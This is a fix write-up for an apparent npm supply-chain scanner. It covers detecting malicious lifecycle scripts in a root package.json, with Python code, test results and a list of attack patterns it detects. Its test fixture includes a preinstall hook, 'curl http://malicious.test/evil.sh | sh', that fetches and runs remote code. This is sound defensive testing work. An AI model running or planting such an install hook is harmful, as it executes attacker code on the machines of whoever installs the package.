# Preinstall Script Detection Fix

## Problem
Preinstall scripts in the root package.json were not being detected during local directory analysis.

## Root Cause
The `analyze_local_directory` function in `tools/local_tools.py` was only analyzing scripts from:
1. Dependencies in node_modules (via `dependency_analysis`)
2. Script findings from SBOM generation (via `extract_packages_from_file`)

However, the root package.json scripts were not being explicitly analyzed.

## Solution
Added explicit analysis of root package.json scripts in the `analyze_local_directory` function.

### Code Changes

**File:** `tools/local_tools.py`

**Added after SBOM generation:**
```python
# Analyze root package.json scripts (npm)
root_package_json = validated_path / "package.json"
if root_package_json.exists():
    try:
        with open(root_package_json, 'r', encoding='utf-8') as f:
            package_data = json.load(f)
        
        scripts = package_data.get('scripts', {})
        package_name = package_data.get('name', 'root-package')
        
        if scripts:
            root_script_findings = _analyze_npm_scripts(scripts, package_name)
            if root_script_findings:
                logger.warning(f"Found {len(root_script_findings)} malicious scripts in root package.json")
                # Add to sbom_data script_findings
                if "script_findings" not in sbom_data:
                    sbom_data["script_findings"] = []
                sbom_data["script_findings"].extend([f.to_dict() for f in root_script_findings])
    except Exception as e:
        logger.error(f"Error analyzing root package.json scripts: {e}")
```

## Testing

### Test Case
**Folder:** `C:\Users\VISHAKHA\Downloads\vuln_samples\vuln_preinstall_script`

**package.json:**
```json
{
  "name": "vuln-preinstall",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://malicious.test/evil.sh | sh"
  }
}
```

### Results
```
✅ Found 2 malicious scripts in root package.json
✅ Total findings: 4
✅ Script findings: 4

Findings:
- CRITICAL: Remote code execution - downloads and executes code from internet
- HIGH: Suspicious network activity
```

### Detection Details
The malicious preinstall script was detected with:
- **Severity:** CRITICAL (automatically escalated from HIGH because it's in a dangerous lifecycle hook)
- **Confidence:** 0.95 (very high confidence for remote code execution in dangerous hooks)
- **Attack Type:** Remote code execution
- **Evidence:**
  - Script: preinstall
  - Command: curl http://malicious.test/evil.sh | sh
  - Lifecycle hook: ⚠️ RUNS AUTOMATICALLY on install
  - Pattern matched: remote_code_execution

## Impact

### Before Fix
- ❌ Root package.json scripts not analyzed
- ❌ Malicious preinstall/install/postinstall scripts missed
- ❌ Only dependency scripts detected

### After Fix
- ✅ Root package.json scripts analyzed
- ✅ All lifecycle hooks detected (preinstall, install, postinstall, etc.)
- ✅ Both root and dependency scripts detected
- ✅ Comprehensive coverage of npm attack vectors

## Related Components

### Detection System
- `_analyze_npm_scripts()` in `tools/sbom_tools.py` - Detects 15 attack patterns
- `analyze_local_directory()` in `tools/local_tools.py` - Main analysis entry point
- `analyze_dependency_tree()` in `tools/dependency_analyzer.py` - Analyzes node_modules

### Attack Patterns Detected
1. Remote Code Execution
2. Base64 Obfuscation
3. Credential Theft
4. Reverse Shell
5. Crypto Mining
6. Data Exfiltration
7. Process Spawning
8. Eval Execution
9. File Manipulation
10. Network Scanning
11. Persistence
12. Privilege Escalation
13. Environment Harvesting
14. Suspicious Network Activity
15. Code Injection

## Verification

To verify the fix works:

```bash
python test_preinstall_detection.py
```

Expected output:
```
Found 2 malicious scripts in root package.json
Total findings: 4
Script findings: 4

Malicious script findings: 4
- Severity: critical
  Package: vuln-preinstall
  Evidence: Remote code execution detected
```

## Files Modified
1. `tools/local_tools.py` - Added root package.json script analysis
2. `test_preinstall_detection.py` - Created test for verification

## Files Created (Previously)
1. `tools/sbom_tools.py` - Added `_analyze_npm_scripts()` function
2. `test_comprehensive_npm_detection.py` - Tests all 15 attack patterns
3. `NPM_ATTACK_DETECTION_GUIDE.md` - Complete documentation
4. `NPM_DETECTION_SUMMARY.md` - Implementation summary

## Status
✅ **FIXED AND TESTED**

The preinstall script detection now works correctly for both root package.json and all dependencies.
